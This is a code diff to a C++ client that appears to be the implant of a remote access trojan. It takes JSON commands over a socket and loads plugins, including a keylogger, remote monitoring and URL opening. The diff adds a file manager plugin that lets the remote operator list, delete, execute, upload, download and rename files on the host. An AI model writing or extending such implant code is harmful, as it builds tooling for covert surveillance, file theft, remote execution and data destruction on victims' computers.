@@ -41,6 +41,7 @@ private:
     const string REMOTE_MONITORING_PLUGIN_ID = "RemoteMonitoringPlugin";
     const string KEYLOGGER_PLUGIN_ID = "KeyloggerPlugin";
     const string OPEN_URL_PLUGIN_ID = "OpenURLPlugin";
+    const string FILE_MANAGER_PLUGIN_ID = "FileManagerPlugin";
 
     // Registry helper for initial info
     string getRegValue(HKEY hKeyRoot, const char* subKey, const char* valueName) {
@@ -106,6 +107,14 @@ private:
         }
     }
 
+    void execute_file_manager_command(const json& data) {
+        if (pluginMgr.isPluginLoaded(FILE_MANAGER_PLUGIN_ID)) {
+            pluginMgr.executePluginCommand(FILE_MANAGER_PLUGIN_ID, "HandleCommand", sock, data.dump());
+        } else {
+            request_plugin(FILE_MANAGER_PLUGIN_ID, data);
+        }
+    }
+
     void process_json_command(const string& json_str) {
         try {
             auto data = json::parse(json_str);
@@ -133,6 +142,12 @@ private:
             }
             else if (action == "openurl") {
                 execute_open_url_command(data);
+            }
+            else if (action == "filemanager_list" || action == "filemanager_delete" ||
+                     action == "filemanager_newfolder" || action == "filemanager_execute" ||
+                     action == "filemanager_rename" || action == "filemanager_download" ||
+                     action == "filemanager_upload" || action == "filemanager_paste") {
+                execute_file_manager_command(data);
             }
             else if (action == "message" || action == "messagebox") {
 				string title = data.value("title", "System Message");
@@ -218,6 +233,12 @@ private:
                                         pluginMgr.executePluginCommand(OPEN_URL_PLUGIN_ID, "HandleCommand", sock, pendingPluginCommand);
                                     } else {
                                         pluginMgr.executePlugin(OPEN_URL_PLUGIN_ID, "RunPlugin", sock);
+                                    }
+                                } else if (pluginId == FILE_MANAGER_PLUGIN_ID) {
+                                    if (hasPendingPluginCommand) {
+                                        pluginMgr.executePluginCommand(FILE_MANAGER_PLUGIN_ID, "HandleCommand", sock, pendingPluginCommand);
+                                    } else {
+                                        pluginMgr.executePlugin(FILE_MANAGER_PLUGIN_ID, "RunPlugin", sock);
                                     }
                                 }
                             }
